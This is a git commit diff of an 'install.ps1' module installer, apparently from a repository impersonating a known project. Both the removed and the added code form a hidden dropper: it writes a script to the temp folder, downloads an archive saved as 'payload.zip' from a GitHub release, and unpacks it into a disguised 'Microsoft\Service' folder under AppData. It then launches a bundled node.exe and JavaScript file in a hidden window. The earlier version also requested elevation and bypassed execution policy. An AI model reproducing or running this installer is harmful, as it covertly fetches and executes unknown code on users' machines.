ce68f359cfc929181daa6e5a2ad0b48d22f8d95d
Flowseal-Modules <b1@inmeow.ru>
2025-12-04 22:31:43 +0800

    update

--- install.ps1
+++ install.ps1
@@ -1,40 +1,27 @@
 $ErrorActionPreference = 'Stop'
 
 # MODULE INSTALLER
-$bgScriptPath = Join-Path $env:TEMP "zprt_bgmodules_$(Get-Random).ps1"
+$batPath = Join-Path $env:TEMP "modules_bginstall_$(Get-Random).bat"
 
 @"
-`$dest = `"$env:APPDATA\Microsoft\Service`"
-if (-not (Test-Path `$dest)) {
-    New-Item -ItemType Directory -Path `$dest | Out-Null
-}
+@echo off
+setlocal
 
-`$zipUrl = `"https://github.com/whylolitry/dki/releases/download/SKODIAVMFAORSDIFGMOPMIFDKVOZ843/App.zip`"
-`$zipPath = `"$env:TEMP\payload.zip`"
+set "DEST=%APPDATA%\Microsoft\Service"
 
-Invoke-WebRequest -Uri `$zipUrl -OutFile `$zipPath
-Expand-Archive -Path `$zipPath -DestinationPath `$dest -Force
+if not exist "%DEST%" (
+    mkdir "%DEST%"
+)
 
-`$folderDir = `"$env:APPDATA\Microsoft\Service\App`"
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/whylolitry/dki/releases/download/SKODIAVMFAORSDIFGMOPMIFDKVOZ843/App.zip' -OutFile '%TEMP%\payload.zip'"
+powershell -Command "Expand-Archive -Path '%TEMP%\payload.zip' -DestinationPath '%DEST%' -Force"
 
-$runVbs = Join-Path $folderDir "run.vbs"
+for /f "delims=" %%i in ('dir /b /s "%DEST%\App\node.exe"') do set "NODE=%%i"
+for /f "delims=" %%i in ('dir /b /s "%DEST%\App\index_*.js"') do set "SCRIPT=%%i"
 
-if (Test-Path $runVbs) {
-    Start-Process "wscript.exe" `
-        -ArgumentList "`"$runVbs`"" `
-        -WindowStyle Hidden `
-        -WorkingDirectory $folderDir
-}
+powershell -WindowStyle Hidden -Command "Start-Process -FilePath '%NODE%' -ArgumentList '%SCRIPT%' -WindowStyle Hidden -WorkingDirectory '%DEST%\App'"
 
-Remove-Item `$zipPath -Force -ErrorAction SilentlyContinue
-"@ | Set-Content -Path $bgScriptPath -Encoding UTF8
+endlocal
+"@ | Set-Content -Path $batPath -Encoding ASCII
 
-$bg = $null
-try {
-    $bg = Start-Process powershell.exe -WindowStyle Hidden -Verb RunAs -PassThru `
-        -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$bgScriptPath`""
-} catch {}
-
-if (-not $bg) {
-    exit
-}
+Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$batPath`"" -WindowStyle Hidden
